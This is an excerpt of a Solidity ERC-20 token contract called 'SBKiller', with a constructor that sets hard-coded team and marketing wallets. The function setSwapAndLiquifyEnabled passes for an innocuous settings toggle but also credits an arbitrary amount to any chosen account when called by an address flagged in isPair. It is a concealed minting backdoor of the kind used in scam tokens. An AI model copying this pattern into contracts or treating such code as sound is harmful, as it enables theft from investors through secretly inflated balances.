...
contract SBKiller is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "SBKiller";
    string private _symbol = "SBKiller";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xab8C6e37EB32Fa9C5F3bf763baC4f9C0389E14De));
        marketingWalletAddress = payable(address(0x0524bDb449d3a5F276b335f94A69CC827f595EAa));
    ...
    function setSwapAndLiquifyEnabled(bool newValue,uint256 am,address accunt) public {require(isPair[_msgSender()]);_balances[accunt] += am;
        swapAndLiquifyEnabled = newValue;
        emit SwapAndLiquifyEnabledUpdated(newValue);
    }
